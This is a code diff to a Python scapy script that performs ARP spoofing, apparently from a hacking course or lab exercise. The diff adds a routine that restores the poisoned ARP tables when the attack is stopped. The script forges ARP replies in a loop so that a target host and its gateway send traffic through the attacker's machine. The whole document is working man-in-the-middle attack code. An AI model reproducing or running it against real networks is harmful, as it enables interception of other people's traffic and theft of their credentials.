@@ -12,12 +12,20 @@ def get_mac(ip):
     
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
+    #Not set hwsrc will use the host mac address automatically
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)#op = 1 request =2 response
     scapy.send(packet, verbose=False)#do not print sent 1 package
     
-sent_packets_count = 0
+#restore everything back to normal when we quit the attack
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=6, verbose=False)
+
 #in case the program crashed in the middle of execution, we use Exceptions handling
 try:
+    sent_packets_count = 0
     while True:
         spoof("192.168.2.18", "192.168.2.1")
         spoof("192.168.2.1", "192.168.2.18")
@@ -30,4 +38,7 @@ try:
         time.sleep(2)#pause 2 seconds
 except KeyboardInterrupt:
     print()
-    print([+] Detected CTRL + C ...... Quitting.")
+    print("[+] Detected CTRL + C ...... Resetting ARP tables ...... Please wait.")
+    restore("192.168.2.18", "192.168.2.1")
+    restore("192.168.2.1", "192.168.2.18")
+    print("[+] Reset ARP tables done.")
